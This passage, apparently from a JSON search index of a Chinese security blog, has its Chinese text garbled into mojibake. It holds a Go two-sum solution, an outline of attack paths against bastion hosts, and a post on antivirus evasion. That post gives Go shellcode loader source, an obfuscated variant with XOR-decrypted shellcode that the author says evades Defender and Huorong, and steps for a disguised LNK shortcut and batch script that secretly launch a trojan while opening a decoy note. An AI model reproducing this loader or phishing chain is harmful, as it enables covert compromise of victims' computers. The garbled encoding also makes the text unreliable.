å¼€å±€ç¬¬ä¸€é¢˜ï¼Œå•¥éƒ½ä¸ä¼šï¼Œé—®äº†kimiè€å¸ˆï¼ŒçŸ¥é“äº†å“ˆå¸Œè¡¨è¿™ä¸ªä¸œè¥¿ï¼Œé‚£ä¹ˆæ€è·¯æ¸…æ™°ï¼š\nä¾æ¬¡è®¿é—®æ•°ç»„çš„å…ƒç´ å¹¶å’Œç›®æ ‡æ•°è®¡ç®—å·®å€¼ï¼Œç„¶åæŸ¥çœ‹å“ˆå¸Œè¡¨ä¸­æ˜¯å¦æœ‰è¿™ä¸ªå·®å€¼ï¼Œæ²¡æœ‰å°±å°†å½“å‰å…ƒç´ æ¨å…¥å“ˆå¸Œè¡¨ï¼Œç„¶ååˆ¤æ–­ä¸‹ä¸€ä¸ª\u0026hellip;\nä»£ç å®ç°ï¼š\nfunc twoSum(nums []int, target int) []int { numMap := make(map[int]int) for i, num := range nums { cha := target - num if j, ok := numMap[cha]; ok { return []int{j, i} } numMap[num] = i } return []int{} } æ—¶é—´å¤æ‚åº¦o(n)ï¼Œç©ºé—´å¤æ‚åº¦o(1)\n"
    }
,
    {
        "title": "å ¡å’æœºçš„åˆ©ç”¨æ€è·¯",
        "link": "/My-Knowlege-Database/blog/rt%E6%8A%80%E6%88%98%E6%B3%95/%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/",
        "content": "å ¡å’æœºçš„åˆ©ç”¨æ€è·¯ å ¡å’æœºæ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨è®¾å¤‡ï¼Œç”¨äºä¿æŠ¤å’Œç®¡ç†ä¼ä¸šå†…éƒ¨ç½‘ç»œä¸å¤–éƒ¨ç½‘ç»œä¹‹é—´çš„è®¿é—®ã€‚å®ƒä½œä¸ºä¸€ç§ä¸­é—´èŠ‚ç‚¹ï¼Œæä¾›å®‰å…¨çš„è®¿é—®æ§åˆ¶å’Œå®¡è®¡åŠŸèƒ½ï¼Œç”¨äºä¿æŠ¤å†…éƒ¨ç½‘ç»œå…å—æœªç»æˆæƒçš„è®¿é—®å’Œæ”»å‡»ã€‚å ¡å’æœºé€šå¸¸è¢«ç”¨ä½œè·³æ¿æœåŠ¡å™¨ï¼Œå³é€šè¿‡å ¡å’æœºæ¥ç®¡ç†å’Œè®¿é—®å…¶ä»–å†…éƒ¨æœåŠ¡å™¨\nç›®æ ‡é‡è¦æ€§ åœ¨æ”»å‡»è§†è§’ä¸‹ï¼Œå ¡å’æœºæ˜¯ä¸€ä¸ªéå¸¸æœ‰ä»·å€¼çš„æ”»å‡»ç›®æ ‡\né‡è¦ç›®æ ‡\nå ¡å’æœºæ˜¯è¿æ¥åˆ°å†…éƒ¨ç½‘ç»œçš„å…³é”®å…¥å£ï¼Œä¸€æ—¦é»‘å®¢æˆåŠŸå…¥ä¾µå ¡å’æœºï¼Œä»–ä»¬å¯ä»¥å€ŸåŠ©å®ƒè¿›ä¸€æ­¥æ·±å…¥å†…éƒ¨ç½‘ç»œï¼Œå¹¶è·å–æ›´å¤šæ•æ„Ÿä¿¡æ¯æˆ–æ§åˆ¶å…¶ä»–ä¸»æœº\næš´éœ²åœ¨å…¬ç½‘ä¸Š\nå ¡å’æœºé€šå¸¸æš´éœ²åœ¨å…¬å…±ç½‘ç»œä¸Šï¼Œè¿™ä½¿å¾—é»‘å®¢å¯ä»¥ç›´æ¥å°è¯•æ”»å‡»å®ƒã€‚ç”±äºå®ƒçš„è§’è‰²æ˜¯æ¥æ”¶å’Œå¤„ç†è¿œç¨‹è¿æ¥ï¼Œå®ƒå¯èƒ½ä¼šå—åˆ°æ¥è‡ªInternetçš„å„ç§æ”»å‡»ï¼Œå¦‚æš´åŠ›ç ´è§£ã€æ¼æ´åˆ©ç”¨ã€æ‹’ç»æœåŠ¡æ”»å‡»ç­‰\næƒé™æå‡\nä¸€æ—¦é»‘å®¢æˆåŠŸå…¥ä¾µå ¡å’æœºï¼Œä»–ä»¬é€šå¸¸ä¼šè¯•å›¾è·å–æ›´é«˜çš„æƒé™ã€‚å ¡å’æœºé€šå¸¸å…·æœ‰ç®¡ç†æƒé™å’Œå¹¿æ³›çš„ç½‘ç»œè®¿é—®æƒé™ï¼Œå› æ­¤é»‘å®¢å¯ä»¥å°è¯•åˆ©ç”¨æ¼æ´ã€å¼±å¯†ç æˆ–å…¶ä»–æŠ€æœ¯æ‰‹æ®µæ¥æå‡ä»–ä»¬çš„æƒé™ï¼Œä»¥è·å–æ›´å¤§çš„æ§åˆ¶æƒ\nå†…éƒ¨ç½‘ç»œè®¿é—®\nå ¡å’æœºæ˜¯é»‘å®¢è¿›å…¥å†…éƒ¨ç½‘ç»œçš„å…³é”®ç‚¹ï¼Œä¸€æ—¦é»‘å®¢æˆåŠŸæ§åˆ¶äº†å ¡å’æœºï¼Œä»–ä»¬å¯ä»¥ä½¿ç”¨å®ƒä½œä¸ºè·³æ¿æ¥è®¿é—®å…¶ä»–å†…éƒ¨ä¸»æœºï¼Œæ¢æµ‹ç½‘ç»œæ‹“æ‰‘ã€è·å–æ•æ„Ÿæ•°æ®ã€æ‰§è¡Œæ¶æ„æ“ä½œç­‰\nä»å®‰å…¨é—®é¢˜ä¸Šï¼Œå ¡å’æœºä¹Ÿååˆ†é‡è¦ï¼š\næ•°æ®æ³„éœ²å’Œéšç§é—®é¢˜\næ”»å‡»è€…å¯ä»¥åˆ©ç”¨å ¡å’æœºè®¿é—®å’Œçªƒå–å®¢æˆ·æ•æ„Ÿæ•°æ®ï¼ŒåŒ…æ‹¬ä¸ªäººèº«ä»½ä¿¡æ¯ã€è´¢åŠ¡æ•°æ®å’Œå•†ä¸šæœºå¯†\næœåŠ¡å½±å“\næ”»å‡»è€…å¯èƒ½é€šè¿‡ç ´åå ¡å’æœºæˆ–æ‹’ç»æœåŠ¡æ”»å‡»çš„æ–¹å¼ä½¿å ¡å’æœºæ— æ³•æ­£å¸¸è¿è¡Œï¼Œå½±å“æ­£å¸¸ä¸šåŠ¡\nèº«ä»½æ¬ºéª—\næ”»å‡»è€…å¯èƒ½é€šè¿‡æ”»å‡»å ¡å’æœºè·å¾—åˆæ³•ç”¨æˆ·çš„èº«ä»½å’Œæƒé™æ¥è¿›è¡Œæ›´æ·±å…¥çš„å†…éƒ¨æ¸—é€\næœªæˆæƒè®¿é—®å†…éƒ¨ç³»ç»Ÿ\næ”»å‡»è€…å¯èƒ½æˆåŠŸéæ³•è·å–å ¡å’æœºçš„è®¿é—®æƒé™ï¼Œè®¿é—®å’Œæ§åˆ¶å†…éƒ¨ç³»ç»Ÿå’ŒæœåŠ¡å™¨\næ”»å‡»é¢\u0026amp;æ”»å‡»è·¯å¾„ åˆ—ä¸¾ä¸€äº›å¸¸è§æ”»å‡»é¢ç”¨äºå‚è€ƒï¼š\næ“ä½œç³»ç»Ÿæ¼æ´\nå ¡å’æœºä½¿ç”¨çš„æ“ä½œç³»ç»Ÿå¯èƒ½å­˜åœ¨å·²çŸ¥æˆ–æœªçŸ¥çš„æ¼æ´ï¼ŒäºŒè¿›åˆ¶å±‚é¢ç›¸å…³æ¼æ´\nåº”ç”¨ç¨‹åºæ¼æ´\nå ¡å’æœºçš„åº”ç”¨ç¨‹åºå¯èƒ½å­˜åœ¨æ¼æ´ï¼Œwebå±‚é¢çš„æ¼æ´\nå¼±å¯†ç å’Œå‡­æ®ç®¡ç†\nå ¡å’æœºç”¨æˆ·ä½¿ç”¨å¼±å£ä»¤æˆ–å‡­æ®ç®¡ç†ä¸å½“\nä¾›åº”é“¾æ”»å‡»\nå ¡å’æœºçš„ä¾›åº”é“¾ç¯èŠ‚å¯èƒ½å­˜åœ¨æ¼æ´æˆ–è¢«æ¶æ„ç¯¡æ”¹ï¼Œè¿›è¡Œä¾›åº”é“¾æŠ•æ¯’\nç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»\næ”»å‡»è€…å¯ä»¥é€šè¿‡é’“é±¼é‚®ä»¶ç­‰ç¤¾ä¼šå·¥ç¨‹å­¦æ‰‹æ®µæ¥æ¬ºéª—å ¡å’æœºçš„ç”¨æˆ·æˆ–ç®¡ç†å‘˜ï¼Œä»¥è·å–å…¶å‡­æ®æˆ–æ‰§è¡Œæ¶æ„æ“ä½œ\nç”±æ­¤æˆ‘ä»¬å¯ä»¥ç»„åˆå‡ºä¸€äº›æ”»å‡»è·¯å¾„ï¼š\n0day/ndayæ”»å‡» é€šè¿‡å ¡å’æœºçš„n dayç”šè‡³æ˜¯å ¡å’æœºçš„0dayå¯¹å ¡å’æœºå®æ–½æ”»å‡»ï¼Œæ¯”å¦‚é€šè¿‡ç»•è¿‡è®¤è¯ç›´æ¥è®¿é—®å ¡å’æœºçš„webæ§åˆ¶å°ï¼Œè·å–å ¡å’æœºçš„webç®¡ç†æƒé™ æ§åˆ¶å ¡å’æœºæ‰€ç®¡ç†çš„èµ„äº§ ä¾›åº”é“¾ é¦–å…ˆæ”»å‡»å ¡å’æœºä¾›åº”å•†ï¼Œåœ¨å ¡å’æœºä¸­æ¤å…¥æ¶æ„ä»£ç ï¼Œä½œä¸ºåé—¨ å…·æœ‰æ¶æ„åé—¨çš„å ¡å’æœºè¢«ä¸‹è½½éƒ¨ç½²åˆ°ä¼ä¸šç¯å¢ƒä¸­ é€šè¿‡è¿æ¥äº‹å…ˆç•™ä¸‹çš„åé—¨ï¼Œæ§åˆ¶å ¡å’æœº é’“é±¼ä»å†…åˆ°å¤– é€šè¿‡é’“é±¼çš„æ–¹å¼æ§åˆ¶ç›®æ ‡ADåŸŸä¸€å°åŸŸæˆå‘˜æœº è¿›è¡Œä¸€ç³»åˆ—æ“ä½œè·å¾—åŸŸæ§æƒé™ å°è¯•é‡ç½®å ¡å’æœºç®¡ç†å‘˜è´¦æˆ·å¯†ç  ç™»å½•å ¡å’æœº é€šè¿‡å ¡å’æœºçš„webæ§åˆ¶å°ç›´æ¥æ§åˆ¶ä¼ä¸šæ ¸å¿ƒç”Ÿäº§ç½‘æœåŠ¡å™¨é›†ç¾¤ ",
        "summary": "å ¡å’æœºçš„åˆ©ç”¨æ€è·¯ å ¡å’æœºæ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨è®¾å¤‡ï¼Œç”¨äºä¿æŠ¤å’Œç®¡ç†ä¼ä¸šå†…éƒ¨ç½‘ç»œä¸å¤–éƒ¨ç½‘ç»œä¹‹é—´çš„è®¿é—®ã€‚å®ƒä½œä¸ºä¸€ç§ä¸­é—´èŠ‚ç‚¹ï¼Œæä¾›å®‰å…¨çš„è®¿é—®æ§åˆ¶å’Œå®¡è®¡åŠŸèƒ½ï¼Œç”¨äºä¿æŠ¤å†…éƒ¨ç½‘ç»œå…å—æœªç»æˆæƒçš„è®¿é—®å’Œæ”»å‡»ã€‚å ¡å’æœºé€šå¸¸è¢«ç”¨ä½œè·³æ¿æœåŠ¡å™¨ï¼Œå³é€šè¿‡å ¡å’æœºæ¥ç®¡ç†å’Œè®¿é—®å…¶ä»–å†…éƒ¨æœåŠ¡å™¨\nç›®æ ‡é‡è¦æ€§ åœ¨æ”»å‡»è§†è§’ä¸‹ï¼Œå ¡å’æœºæ˜¯ä¸€ä¸ªéå¸¸æœ‰ä»·å€¼çš„æ”»å‡»ç›®æ ‡\né‡è¦ç›®æ ‡\nå ¡å’æœºæ˜¯è¿æ¥åˆ°å†…éƒ¨ç½‘ç»œçš„å…³é”®å…¥å£ï¼Œä¸€æ—¦é»‘å®¢æˆåŠŸå…¥ä¾µå ¡å’æœºï¼Œä»–ä»¬å¯ä»¥å€ŸåŠ©å®ƒè¿›ä¸€æ­¥æ·±å…¥å†…éƒ¨ç½‘ç»œï¼Œå¹¶è·å–æ›´å¤šæ•æ„Ÿä¿¡æ¯æˆ–æ§åˆ¶å…¶ä»–ä¸»æœº\næš´éœ²åœ¨å…¬ç½‘ä¸Š\nå ¡å’æœºé€šå¸¸æš´éœ²åœ¨å…¬å…±ç½‘ç»œä¸Šï¼Œè¿™ä½¿å¾—é»‘å®¢å¯ä»¥ç›´æ¥å°è¯•æ”»å‡»å®ƒã€‚ç”±äºå®ƒçš„è§’è‰²æ˜¯æ¥æ”¶å’Œå¤„ç†è¿œç¨‹è¿æ¥ï¼Œå®ƒå¯èƒ½ä¼šå—åˆ°æ¥è‡ªInternetçš„å„ç§æ”»å‡»ï¼Œå¦‚æš´åŠ›ç ´è§£ã€æ¼æ´åˆ©ç”¨ã€æ‹’ç»æœåŠ¡æ”»å‡»ç­‰\næƒé™æå‡\nä¸€æ—¦é»‘å®¢æˆåŠŸå…¥ä¾µå ¡å’æœºï¼Œä»–ä»¬é€šå¸¸ä¼šè¯•å›¾è·å–æ›´é«˜çš„æƒé™ã€‚å ¡å’æœºé€šå¸¸å…·æœ‰ç®¡ç†æƒé™å’Œå¹¿æ³›çš„ç½‘ç»œè®¿é—®æƒé™ï¼Œå› æ­¤é»‘å®¢å¯ä»¥å°è¯•åˆ©ç”¨æ¼æ´ã€å¼±å¯†ç æˆ–å…¶ä»–æŠ€æœ¯æ‰‹æ®µæ¥æå‡ä»–ä»¬çš„æƒé™ï¼Œä»¥è·å–æ›´å¤§çš„æ§åˆ¶æƒ\nå†…éƒ¨ç½‘ç»œè®¿é—®\nå ¡å’æœºæ˜¯é»‘å®¢è¿›å…¥å†…éƒ¨ç½‘ç»œçš„å…³é”®ç‚¹ï¼Œä¸€æ—¦é»‘å®¢æˆåŠŸæ§åˆ¶äº†å ¡å’æœºï¼Œä»–ä»¬å¯ä»¥ä½¿ç”¨å®ƒä½œä¸ºè·³æ¿æ¥è®¿é—®å…¶ä»–å†…éƒ¨ä¸»æœºï¼Œæ¢æµ‹ç½‘ç»œæ‹“æ‰‘ã€è·å–æ•æ„Ÿæ•°æ®ã€æ‰§è¡Œæ¶æ„æ“ä½œç­‰\nä»å®‰å…¨é—®é¢˜ä¸Šï¼Œå ¡å’æœºä¹Ÿååˆ†é‡è¦ï¼š\næ•°æ®æ³„éœ²å’Œéšç§é—®é¢˜\næ”»å‡»è€…å¯ä»¥åˆ©ç”¨å ¡å’æœºè®¿é—®å’Œçªƒå–å®¢æˆ·æ•æ„Ÿæ•°æ®ï¼ŒåŒ…æ‹¬ä¸ªäººèº«ä»½ä¿¡æ¯ã€è´¢åŠ¡æ•°æ®å’Œå•†ä¸šæœºå¯†\næœåŠ¡å½±å“\næ”»å‡»è€…å¯èƒ½é€šè¿‡ç ´åå ¡å’æœºæˆ–æ‹’ç»æœåŠ¡æ”»å‡»çš„æ–¹å¼ä½¿å ¡å’æœºæ— æ³•æ­£å¸¸è¿è¡Œï¼Œå½±å“æ­£å¸¸ä¸šåŠ¡\nèº«ä»½æ¬ºéª—\næ”»å‡»è€…å¯èƒ½é€šè¿‡æ”»å‡»å ¡å’æœºè·å¾—åˆæ³•ç”¨æˆ·çš„èº«ä»½å’Œæƒé™æ¥è¿›è¡Œæ›´æ·±å…¥çš„å†…éƒ¨æ¸—é€\næœªæˆæƒè®¿é—®å†…éƒ¨ç³»ç»Ÿ\næ”»å‡»è€…å¯èƒ½æˆåŠŸéæ³•è·å–å ¡å’æœºçš„è®¿é—®æƒé™ï¼Œè®¿é—®å’Œæ§åˆ¶å†…éƒ¨ç³»ç»Ÿå’ŒæœåŠ¡å™¨\næ”»å‡»é¢\u0026amp;æ”»å‡»è·¯å¾„ åˆ—ä¸¾ä¸€äº›å¸¸è§æ”»å‡»é¢ç”¨äºå‚è€ƒï¼š\næ“ä½œç³»ç»Ÿæ¼æ´\nå ¡å’æœºä½¿ç”¨çš„æ“ä½œç³»ç»Ÿå¯èƒ½å­˜åœ¨å·²çŸ¥æˆ–æœªçŸ¥çš„æ¼æ´ï¼ŒäºŒè¿›åˆ¶å±‚é¢ç›¸å…³æ¼æ´\nåº”ç”¨ç¨‹åºæ¼æ´\nå ¡å’æœºçš„åº”ç”¨ç¨‹åºå¯èƒ½å­˜åœ¨æ¼æ´ï¼Œwebå±‚é¢çš„æ¼æ´\nå¼±å¯†ç å’Œå‡­æ®ç®¡ç†\nå ¡å’æœºç”¨æˆ·ä½¿ç”¨å¼±å£ä»¤æˆ–å‡­æ®ç®¡ç†ä¸å½“\nä¾›åº”é“¾æ”»å‡»\nå ¡å’æœºçš„ä¾›åº”é“¾ç¯èŠ‚å¯èƒ½å­˜åœ¨æ¼æ´æˆ–è¢«æ¶æ„ç¯¡æ”¹ï¼Œè¿›è¡Œä¾›åº”é“¾æŠ•æ¯’\nç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»\næ”»å‡»è€…å¯ä»¥é€šè¿‡é’“é±¼é‚®ä»¶ç­‰ç¤¾ä¼šå·¥ç¨‹å­¦æ‰‹æ®µæ¥æ¬ºéª—å ¡å’æœºçš„ç”¨æˆ·æˆ–ç®¡ç†å‘˜ï¼Œä»¥è·å–å…¶å‡­æ®æˆ–æ‰§è¡Œæ¶æ„æ“ä½œ\nç”±æ­¤æˆ‘ä»¬å¯ä»¥ç»„åˆå‡ºä¸€äº›æ”»å‡»è·¯å¾„ï¼š\n0day/ndayæ”»å‡» é€šè¿‡å ¡å’æœºçš„n dayç”šè‡³æ˜¯å ¡å’æœºçš„0dayå¯¹å ¡å’æœºå®æ–½æ”»å‡»ï¼Œæ¯”å¦‚é€šè¿‡ç»•è¿‡è®¤è¯ç›´æ¥è®¿é—®å ¡å’æœºçš„webæ§åˆ¶å°ï¼Œè·å–å ¡å’æœºçš„webç®¡ç†æƒé™ æ§åˆ¶å ¡å’æœºæ‰€ç®¡ç†çš„èµ„äº§ ä¾›åº”é“¾ é¦–å…ˆæ”»å‡»å ¡å’æœºä¾›åº”å•†ï¼Œåœ¨å ¡å’æœºä¸­æ¤å…¥æ¶æ„ä»£ç ï¼Œä½œä¸ºåé—¨ å…·æœ‰æ¶æ„åé—¨çš„å ¡å’æœºè¢«ä¸‹è½½éƒ¨ç½²åˆ°ä¼ä¸šç¯å¢ƒä¸­ é€šè¿‡è¿æ¥äº‹å…ˆç•™ä¸‹çš„åé—¨ï¼Œæ§åˆ¶å ¡å’æœº é’“é±¼ä»å†…åˆ°å¤– é€šè¿‡é’“é±¼çš„æ–¹å¼æ§åˆ¶ç›®æ ‡ADåŸŸä¸€å°åŸŸæˆå‘˜æœº è¿›è¡Œä¸€ç³»åˆ—æ“ä½œè·å¾—åŸŸæ§æƒé™ å°è¯•é‡ç½®å ¡å’æœºç®¡ç†å‘˜è´¦æˆ·å¯†ç  ç™»å½•å ¡å’æœº é€šè¿‡å ¡å’æœºçš„webæ§åˆ¶å°ç›´æ¥æ§åˆ¶ä¼ä¸šæ ¸å¿ƒç”Ÿäº§ç½‘æœåŠ¡å™¨é›†ç¾¤ "
    }
,
    {
        "title": "å°è®°goåŠ è½½å™¨å…æ€+Lnkæ–‡ä»¶é’“é±¼æ€è·¯",
        "link": "/My-Knowlege-Database/blog/%E5%85%8D%E6%9D%80/%E5%B0%8F%E8%AE%B0go%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%85%8D%E6%9D%80+lnk%E6%96%87%E4%BB%B6%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF/",
        "content": "å°è®°goåŠ è½½å™¨å…æ€+lnkæ–‡ä»¶é’“é±¼æ€è·¯ æœ¬ç¯‡æ–‡ç« å…·æœ‰æ—¶æ•ˆæ€§ï¼Œå¯èƒ½è¿‡ä¸€ä¸¤ä¸ªæœˆè¿™äº›åŠ è½½å™¨ä¹Ÿè·‘ä¸æ‰äº†\næ³¨: æœ¬äººéä¸“ä¸šäºŒè¿›åˆ¶ç ”ç©¶äººå‘˜ï¼Œå­¦ä¹ å…æ€ä»…ä¸ºæ—¥å¸¸æ”»é˜²åœºæ™¯æå‡å¯¹æŠ—èµ„æœ¬ï¼Œå¦‚æœ‰æŠ€æœ¯é”™è¯¯æ¬¢è¿çº æ­£\nåŸºç¡€åŠ è½½å™¨ åŸºç¡€æ ¼å¼å¦‚ä¸‹ï¼Œæœ‰cmdå¼¹çª—ï¼š\npackage main import ( \u0026#34;syscall\u0026#34; \u0026#34;unsafe\u0026#34; ) func main() { shellcode := []byte{} // 1ã€è·å–dll kernel32 := syscall.MustLoadDLL(\u0026#34;kernel32.dll\u0026#34;) // 2ã€è°ƒç”¨dllçš„å‡½æ•° VirtualAlloc := kernel32.MustFindProc(\u0026#34;VirtualAlloc\u0026#34;) RtlMoveMemory := kernel32.MustFindProc(\u0026#34;RtlMoveMemory\u0026#34;) CreateThread := kernel32.MustFindProc(\u0026#34;CreateThread\u0026#34;) WaitForSingleObject := kernel32.MustFindProc(\u0026#34;WaitForSingleObject\u0026#34;) // 3ã€ç”³è¯·å†…å­˜ addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40) // 4ã€å¤åˆ¶shellcodeåˆ°å†…å­˜ä¸­ RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(\u0026amp;shellcode[0])), uintptr(len(shellcode))) // 5ã€åˆ›å»ºçº¿ç¨‹ thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0) // 6ã€è¿è¡Œ WaitForSingleObject.Call(thread, 0xFFFFFFFF) // 7.å…³é—­ DLL kernel32.Release() } æˆ‘ä»¬å¯ä»¥åŸºäºè¿™ä¸ªåŸºç¡€åŠ è½½å™¨è¿›è¡Œåç»­çš„å…æ€\nç‰¹å¾éšè—è¿‡defender+ç«ç»’(2025.9.20) é¦–å…ˆæ˜¯æˆ‘ä»¬åˆå§‹çš„åŠ è½½å™¨å…·æœ‰ä¸€äº›ç‰¹å¾ï¼š\næ˜æ–‡shellcode æ˜æ˜¾çš„å˜é‡å…³é”®å­— æ˜æ˜¾çš„ä»£ç é€»è¾‘ å¯¹æ­¤æˆ‘ä»¬å¯ä»¥ç»™å‡ºå¦‚ä¸‹æ–¹æ¡ˆï¼š\nå˜é‡åä½¿ç”¨éšæœºå­—ç¬¦ä¸²\nåŠ è§£å¯†shellcode\nåŠ å…¥æ··æ·†æ— ç”¨ä»£ç \né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„åŠ è½½å™¨ä»£ç ï¼Œæœ‰cmdå¼¹çª—ï¼š\npackage main import ( \u0026#34;crypto/rand\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;math/big\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;syscall\u0026#34; \u0026#34;time\u0026#34; \u0026#34;unsafe\u0026#34; ) // æ··æ·†å‡½æ•° - ç”Ÿæˆéšæœºå­—ç¬¦ä¸² func qwerty123RandomStr(n int) string { letters := \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#34; ret := make([]byte, n) for i := 0; i \u0026lt; n; i++ { num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters)))) ret[i] = letters[num.Int64()] } return string(ret) } // æ··æ·†å‡½æ•° - å‡çš„æ–‡ä»¶æ“ä½œ func asdf456FakeFileOp() { tempFile := qwerty123RandomStr(8) + \u0026#34;.tmp\u0026#34; f, _ := os.Create(tempFile) f.WriteString(qwerty123RandomStr(100)) f.Close() os.Remove(tempFile) } // æ··æ·†å‡½æ•° - å‡çš„ç½‘ç»œæ£€æŸ¥ func zxcv789FakeNetCheck() bool { hostnames := []string{\u0026#34;google.com\u0026#34;, \u0026#34;microsoft.com\u0026#34;, \u0026#34;github.com\u0026#34;} for _, host := range hostnames { if strings.Contains(host, \u0026#34;google\u0026#34;) { return true } } return false } // XORè§£å¯†å‡½æ•° func hjkl012DecryptShellcode(encrypted []byte, key byte) []byte { decrypted := make([]byte, len(encrypted)) for i := 0; i \u0026lt; len(encrypted); i++ { decrypted[i] = encrypted[i] ^ key } return decrypted } func main() { // æ··æ·†ä»£ç  - éšæœºå»¶æ—¶ time.Sleep(time.Duration(100+len(qwerty123RandomStr(5))) * time.Millisecond) // æ··æ·†ä»£ç  - å‡æ“ä½œ asdf456FakeFileOp() if !zxcv789FakeNetCheck() { fmt.Println(\u0026#34;Network check failed\u0026#34;) } // åŠ å¯†çš„shellcode (éœ€è¦æ‰‹åŠ¨æ›¿æ¢ä¸ºåŠ å¯†åçš„æ•°æ®) uiop345EncryptedData := []byte{} // XORå¯†é’¥ (ä¸åŠ å¯†è„šæœ¬ä¸­çš„å¯†é’¥ä¿æŒä¸€è‡´) bnm678XorKey := byte(0x99) // è§£å¯†shellcode qwer901DecodedPayload := hjkl012DecryptShellcode(uiop345EncryptedData, bnm678XorKey) // æ··æ·†ä»£ç  - æ— ç”¨è®¡ç®— vbnm234DummyVar := 0 for i := 0; i \u0026lt; 1000; i++ { vbnm234DummyVar += i * 2 } // è·å–ç³»ç»Ÿåº“ fghj567SystemLib := syscall.MustLoadDLL(\u0026#34;kernel32.dll\u0026#34;) // è·å–APIå‡½æ•° rtyu890MemAlloc := fghj567SystemLib.MustFindProc(\u0026#34;VirtualAlloc\u0026#34;) yuio123MemCopy := fghj567SystemLib.MustFindProc(\u0026#34;RtlMoveMemory\u0026#34;) dfgh456ThreadCreate := fghj567SystemLib.MustFindProc(\u0026#34;CreateThread\u0026#34;) cvbn789WaitFunc := fghj567SystemLib.MustFindProc(\u0026#34;WaitForSingleObject\u0026#34;) // æ··æ·†ä»£ç  - å­—ç¬¦ä¸²æ“ä½œ poiu345TempStr := qwerty123RandomStr(20) if len(poiu345TempStr) \u0026gt; 10 { poiu345TempStr = poiu345TempStr[:10] } // ç”³è¯·å†…å­˜ç©ºé—´ lkjh678MemAddr, _, _ := rtyu890MemAlloc.Call(0, uintptr(len(qwer901DecodedPayload)), 0x1000|0x2000, 0x40) // å¤åˆ¶è§£å¯†åçš„shellcodeåˆ°å†…å­˜ yuio123MemCopy.Call(lkjh678MemAddr, uintptr(unsafe.Pointer(\u0026amp;qwer901DecodedPayload[0])), uintptr(len(qwer901DecodedPayload))) // æ··æ·†ä»£ç  - æ›´å¤šæ— ç”¨æ“ä½œ mnbv012Counter := 0 for mnbv012Counter \u0026lt; 50 { mnbv012Counter++ if mnbv012Counter%10 == 0 { time.Sleep(1 * time.Millisecond) } } // åˆ›å»ºæ‰§è¡Œçº¿ç¨‹ qazw345ThreadHandle, _, _ := dfgh456ThreadCreate.Call(0, 0, lkjh678MemAddr, 0, 0, 0) // ç­‰å¾…çº¿ç¨‹æ‰§è¡Œå®Œæˆ cvbn789WaitFunc.Call(qazw345ThreadHandle, 0xFFFFFFFF) // é‡Šæ”¾ç³»ç»Ÿåº“ fghj567SystemLib.Release() // æ··æ·†ä»£ç  - æœ€åçš„æ— ç”¨æ“ä½œ for i := 0; i \u0026lt; 100; i++ { _ = qwerty123RandomStr(5) } } ç¼–è¯‘æ—¶ä½¿ç”¨-ldflags -H=windowsguiå‚æ•°æ¥éšè—cmdçª—å£ï¼š\ngo build -ldflags -H=windowsgui æˆªè‡³ä»Šå¤©ï¼ˆ2025/9/20ï¼‰æµ‹è¯•æ˜¯å¯ä»¥è¿‡ç«ç»’çš„ï¼š\ndefenderä¹Ÿæ˜¯ï¼š\nå…¶ä»–å¼•æ“æ£€å‡ºç‡ï¼Œè¿˜æ˜¯ç›¸å½“å¯è§‚ï¼š\nä½†æ˜¯è¿™é‡Œ360å¼€æ‰«æä¼šæ€ï¼Œæ‰€ä»¥å¦‚æœç›®æ ‡ç¾¤ä½“ç”µè„‘å¯èƒ½æœ‰360çš„è¯è¿˜éœ€è¦è¿›ä¸€æ­¥å…æ€\nåˆ¶ä½œlnkæ–‡ä»¶é’“é±¼(2025.11.4) å¾ˆä¹…æ²¡æ›´æ–°äº†ï¼Œè¯•äº†ä¸‹å‘ç°åˆ°ç°åœ¨ä¾ç„¶æ²¡æœ‰è¢«defenderå’Œç«ç»’æ€æ‰ï¼ˆ2025/11/4ï¼‰ï¼Œé‚£ä¹ˆç»§ç»­å§ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ©äººè€³ç›®é˜¶æ®µï¼Œç›´æ¥å‘exeè¿˜æ˜¯æ²¡äººæ•¢ç‚¹ï¼Œæˆ‘ä»¬è¿™é‡Œå°±æ¥ä¼ªè£…ä¸€ä¸‹è¿™ä¸ªæœ¨é©¬ï¼Œè®©æˆ‘çš„CTFé˜Ÿå‹ç”µè„‘ä¸Šçº¿ï¼š\né¦–å…ˆåˆ›å»ºä¸€ä¸ªå¿«æ·æ–¹å¼ï¼Œå±æ€§è¿™æ ·è®¾ç½®ï¼š\nå…¶ä¸­ç›®æ ‡æˆ‘æ˜¯è¿™æ ·å†™çš„ï¼š\nC:\\Windows\\System32\\cmd.exe /c \u0026#34;.\\__MACOSX\\.note\\note.bat\u0026#34; \u0026amp;\u0026amp; exit å›¾æ ‡æˆ‘æŒ‘é€‰çš„å¸¸è§„æ–‡æœ¬æ–‡æ¡£ï¼Œä¹Ÿå¯ä»¥å‚è€ƒç½‘ä¸Šçš„æ–¹æ³•æ”¹ä¸ºPDF\næ¥ä¸‹æ¥æˆ‘ä»¬åœ¨åŒç›®å½•åˆ›å»ºç›®å½•\\__MACOSX\\.noteï¼Œå¹¶åœ¨é‡Œé¢æ”¾ä¸‰ä¸ªä¸œè¥¿ï¼šä¸€ä¸ªbatè„šæœ¬ï¼Œä¸€ä¸ªå¸¸è§„txtæ–‡ä»¶ï¼Œä¸€ä¸ªæœ¨é©¬\nbatè„šæœ¬çš„å†…å®¹å¦‚ä¸‹ï¼š\n@echo off start /b \u0026#34;\u0026#34; \u0026#34;.\\__MACOSX\\.note\\note.exe\u0026#34; start \u0026#34;\u0026#34; notepad \u0026#34;.\\__MACOSX\\.note\\note.txt\u0026#34; è¿™æ ·å¯ä»¥æ— 